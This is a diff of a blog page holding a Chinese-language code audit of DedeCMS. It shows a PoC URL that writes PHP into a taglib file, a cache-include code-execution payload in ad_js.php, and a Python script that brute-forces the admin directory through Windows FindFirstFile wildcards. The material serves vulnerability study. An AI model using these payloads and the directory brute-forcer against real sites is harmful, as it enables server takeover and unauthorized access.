+    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))
+    {
+        ShowMsg(&#39;文件名不合法，不允许进行操作！&#39;, &#39;-1&#39;);
+        exit();
+    }
+    require_once(DEDEINC.&#39;/oxwindow.class.php&#39;);
+    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);
+    $content = stripslashes($content);
+    $truefile = DEDEINC.&#39;/taglib/&#39;.$filename;
+    $fp = fopen($truefile, &#39;w&#39;);
+    fwrite($fp, $content);
+    fclose($fp);
+    ......
+}</code></pre><p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
 <p>action=savetag时，进行csrf()检测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function csrf_check()</span><br><span class="line">&#123;</span><br><span class="line">    global $token;</span><br><span class="line"></span><br><span class="line">    if(!isset($token) || strcasecmp($token, $_SESSION[&apos;token&apos;]) != 0)&#123;</span><br><span class="line">        echo &apos;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>function csrf_check()
+{
+    global $token;
 
-<p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
+    if(!isset($token) || strcasecmp($token, $_SESSION[&#39;token&#39;]) != 0){
+        echo &#39;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#39;;
+        exit;
+    }
+}</code></pre><p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
 <p>回溯tpl.php，追踪一下token：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if ($action == &apos;upload&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        ....</span><br><span class="line">        &lt;input name=&apos;acdir&apos; type=&apos;hidden&apos; value=&apos;$acdir&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;token&apos; type=&apos;hidden&apos; value=&apos;&#123;$_SESSION[&apos;token&apos;]&#125;&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;upfile&apos; type=&apos;file&apos; id=&apos;upfile&apos; style=&apos;width:380px&apos; /&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
+<pre><code>else if ($action == &#39;upload&#39;)
+{
+        ....
+        &lt;input name=&#39;acdir&#39; type=&#39;hidden&#39; value=&#39;$acdir&#39;  /&gt;
+        &lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;{$_SESSION[&#39;token&#39;]}&#39;  /&gt;
+        &lt;input name=&#39;upfile&#39; type=&#39;file&#39; id=&#39;upfile&#39; style=&#39;width:380px&#39; /&gt;
+}</code></pre><p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
 <p>token搞定了，再让我们继续往下审~</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$truefile = DEDEINC.&apos;/taglib/&apos;.$filename;</span><br></pre></td></tr></table></figure>
-
-<p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fwrite($fp, $content);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
-
-<p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</span><br></pre></td></tr></table></figure>
-
-<p>在include/taglib下会产生相应xxx.lib.php</p>
+<pre><code>$truefile = DEDEINC.&#39;/taglib/&#39;.$filename;</code></pre><p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
+<pre><code>    fwrite($fp, $content);
+    fclose($fp);</code></pre><p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
+<pre><code>http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</code></pre><p>在include/taglib下会产生相应xxx.lib.php</p>
 <h2 id="后台代码执行Getshell"><a href="#后台代码执行Getshell" class="headerlink" title="后台代码执行Getshell"></a>后台代码执行Getshell</h2><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题代码位于：/uploads/plus/ad_js.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> */</span><br><span class="line">require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($arcID)) $aid = $arcID;</span><br><span class="line">$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;</span><br><span class="line">if($aid==0) die(&apos; Request Error! &apos;);</span><br><span class="line"></span><br><span class="line">$cacheFile = DEDEDATA.&apos;/cache/myad-&apos;.$aid.&apos;.htm&apos;;</span><br><span class="line">if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</span><br><span class="line">&#123;</span><br><span class="line">    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&apos;$aid&apos; &quot;);</span><br><span class="line">    $adbody = &apos;&apos;;</span><br><span class="line">    if($row[&apos;timeset&apos;]==0)</span><br><span class="line">    &#123;</span><br><span class="line">        $adbody = $row[&apos;normbody&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $ntime = time();</span><br><span class="line">        if($ntime &gt; $row[&apos;endtime&apos;] || $ntime &lt; $row[&apos;starttime&apos;]) &#123;</span><br><span class="line">            $adbody = $row[&apos;expbody&apos;];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $adbody = $row[&apos;normbody&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $adbody = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;,$adbody);</span><br><span class="line">    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);</span><br><span class="line">    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);</span><br><span class="line">    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;&#123;$adbody&#125;\&quot;);\r\n--&gt;\r\n&quot;;</span><br><span class="line">    $fp = fopen($cacheFile, &apos;w&apos;);</span><br><span class="line">    fwrite($fp, $adbody);</span><br><span class="line">    fclose($fp); </span><br><span class="line">&#125;</span><br><span class="line">include $cacheFile;</span><br></pre></td></tr></table></figure>
+<pre><code> */
+require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);
 
-<p>摘出关键语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</span><br></pre></td></tr></table></figure>
+if(isset($arcID)) $aid = $arcID;
+$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;
+if($aid==0) die(&#39; Request Error! &#39;);
 
-<p>要求$nocache存在，又可以利用前面的全局变量注册</p>
+$cacheFile = DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39;;
+if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )
+{
+    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);
+    $adbody = &#39;&#39;;
+    if($row[&#39;timeset&#39;]==0)
+    {
+        $adbody = $row[&#39;normbody&#39;];
+    }
+    else
+    {
+        $ntime = time();
+        if($ntime &gt; $row[&#39;endtime&#39;] || $ntime &lt; $row[&#39;starttime&#39;]) {
+            $adbody = $row[&#39;expbody&#39;];
+        } else {
+            $adbody = $row[&#39;normbody&#39;];
+        }
+    }
+    $adbody = str_replace(&#39;&quot;&#39;, &#39;\&quot;&#39;,$adbody);
+    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);
+    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);
+    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;{$adbody}\&quot;);\r\n--&gt;\r\n&quot;;
+    $fp = fopen($cacheFile, &#39;w&#39;);
+    fwrite($fp, $adbody);
+    fclose($fp); 
+}
+include $cacheFile;</code></pre><p>摘出关键语句：</p>
+<pre><code>if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</code></pre><p>要求$nocache存在，又可以利用前面的全局变量注册</p>
 <p>往下走Getone()函数进行sql查询，返回一个结果集。</p>
 <p>而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。</p>
 <p>接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。</p>
@@ -403,37 +501,119 @@
 <h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们已经保存过一个页面了，直接poke一下<code>http://localhost/dedecms/uploads/plus/ad_js.php?aid=1</code>看看<br><img src="https://s1.ax1x.com/2018/08/22/PTGtFe.png" alt></p>
 <p>查看写入文件：<code>http://localhost/dedecms/uploads/data/cache/myad-1.htm</code><br><img src="https://s1.ax1x.com/2018/08/22/PTGUWd.png" alt></p>
 <p>htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hpdoger=echo &apos;--&gt;&apos;; phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
+<pre><code>hpdoger=echo &#39;--&gt;&#39;; phpinfo();</code></pre><p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
 <h2 id="winapi查找后台目录"><a href="#winapi查找后台目录" class="headerlink" title="winapi查找后台目录"></a>winapi查找后台目录</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、win系统下搭建的网站<br>2、网站后台目录存在/images/adminico.gif</p>
 <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。</p>
 <p>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
 <h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>核心文件：common.inc.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    require_once(DEDEINC.&apos;/uploadsafe.inc.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>追踪uploadsafe.inc.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )</span><br><span class="line">&#123;</span><br><span class="line">    exit(&apos;Request var not allow for uploadsafe!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$$_key = $_FILES[$_key][&apos;tmp_name&apos;]; //获取temp_name </span><br><span class="line">$&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];</span><br><span class="line">$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);</span><br><span class="line">$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);</span><br><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(empty($&#123;$_key.&apos;_size&apos;&#125;))</span><br><span class="line">&#123;</span><br><span class="line">    $&#123;$_key.&apos;_size&apos;&#125; = @filesize($$_key);</span><br><span class="line">&#125;</span><br><span class="line">$imtypes = array</span><br><span class="line">(</span><br><span class="line">    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, </span><br><span class="line">    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;</span><br><span class="line">);</span><br><span class="line">if(in_array(strtolower(trim($&#123;$_key.&apos;_type&apos;&#125;)), $imtypes))</span><br><span class="line">&#123;</span><br><span class="line">    $image_dd = @getimagesize($$_key); </span><br><span class="line">    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span><br><span class="line">    if (!is_array($image_dd))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>摘出这句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_dd = @getimagesize($$_key);</span><br></pre></td></tr></table></figure>
-
-<p>进行判断$$_key是否为图片或图片是否存在</p>
+<pre><code>if($_FILES)
+{
+    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
+}</code></pre><p>追踪uploadsafe.inc.php</p>
+<pre><code>if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) )
+{
+    exit(&#39;Request var not allow for uploadsafe!&#39;);
+}
+$$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name 
+${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
+${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
+${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
+if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
+{
+    if(!defined(&#39;DEDEADMIN&#39;))
+    {
+        exit(&#39;Not Admin Upload filetype not allow !&#39;);
+    }
+}
+if(empty(${$_key.&#39;_size&#39;}))
+{
+    ${$_key.&#39;_size&#39;} = @filesize($$_key);
+}
+$imtypes = array
+(
+    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
+    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
+);
+if(in_array(strtolower(trim(${$_key.&#39;_type&#39;})), $imtypes))
+{
+    $image_dd = @getimagesize($$_key); 
+    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
+    if (!is_array($image_dd))
+    {
+        exit(&#39;Upload filetype not allow !&#39;);
+    }
+}</code></pre><p>摘出这句：</p>
+<pre><code> $image_dd = @getimagesize($$_key); </code></pre><p>进行判断$$_key是否为图片或图片是否存在</p>
 <p>然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的</p>
 <p>接着再看同文件的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];</span><br><span class="line">$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);</span><br><span class="line">$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);</span><br><span class="line"></span><br><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>    ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
+    ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
+    ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
 
-<p>其中,$cfg_not_allowall的范围如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
+    if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
+    {
+        if(!defined(&#39;DEDEADMIN&#39;))
+        {
+            exit(&#39;Not Admin Upload filetype not allow !&#39;);
+        }
+    }</code></pre><p>其中,$cfg_not_allowall的范围如下：</p>
+<pre><code>$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</code></pre><p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
 <p>找一处验证以下这个核心文件产生的小漏洞：<br><img src="https://s1.ax1x.com/2018/08/21/PIOPhV.png" alt><br><img src="https://s1.ax1x.com/2018/08/21/PIOk1U.png" alt></p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</span><br></pre></td></tr></table></figure>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</code></pre><p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
+<pre><code># -*- coding: utf-8 -*-
+from itertools import permutations
+import requests
 
-<p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from itertools import permutations</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def guess_back_dir(url,data,characters):</span><br><span class="line">    for num in range(1,5):</span><br><span class="line">        for every in permutations(characters,num):</span><br><span class="line">            payload = &apos;&apos;.join(every)</span><br><span class="line">            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)</span><br><span class="line">            print(&quot;testing:&quot;,payload)</span><br><span class="line">            r = requests.post(url,data = data)</span><br><span class="line">            if find_page(r) &gt; 0:</span><br><span class="line">                print(&quot;back_dir:[+]&quot;,payload)</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">                return payload</span><br><span class="line">            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line"></span><br><span class="line">def guess_rest_dir(back_dir,url,data,characters):</span><br><span class="line">    while True:</span><br><span class="line">        for singel in characters:</span><br><span class="line">            if singel != characters[-1]:</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)</span><br><span class="line">                r = requests.post(url,data = data)</span><br><span class="line">                # print data</span><br><span class="line">                if find_page(r) &gt; 0:</span><br><span class="line">                    print(&quot;guess successfully[+]:&quot;,back_dir)</span><br><span class="line">                    back_dir += singel</span><br><span class="line">                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">                    break</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">            else:</span><br><span class="line">                return  back_dir</span><br><span class="line"></span><br><span class="line">def find_page(response):</span><br><span class="line">    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;</span><br><span class="line">    url = raw_input(&quot;Please input your target:&quot;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;,</span><br><span class="line">        &quot;_FILES[hpdoger][name]&quot;: 0,</span><br><span class="line">        &quot;_FILES[hpdoger][size]&quot;: 0,</span><br><span class="line">        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    back_dir = guess_back_dir(url,data,characters)</span><br><span class="line">    name = guess_rest_dir(back_dir,url,data,characters)</span><br><span class="line">    print(&quot;The background address is[+]:&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+def guess_back_dir(url,data,characters):
+    for num in range(1,5):
+        for every in permutations(characters,num):
+            payload = &#39;&#39;.join(every)
+            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)
+            print(&quot;testing:&quot;,payload)
+            r = requests.post(url,data = data)
+            if find_page(r) &gt; 0:
+                print(&quot;back_dir:[+]&quot;,payload)
+                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
+                return payload
+            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
 
-<h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
+def guess_rest_dir(back_dir,url,data,characters):
+    while True:
+        for singel in characters:
+            if singel != characters[-1]:
+                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)
+                r = requests.post(url,data = data)
+                # print data
+                if find_page(r) &gt; 0:
+                    print(&quot;guess successfully[+]:&quot;,back_dir)
+                    back_dir += singel
+                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
+                    break
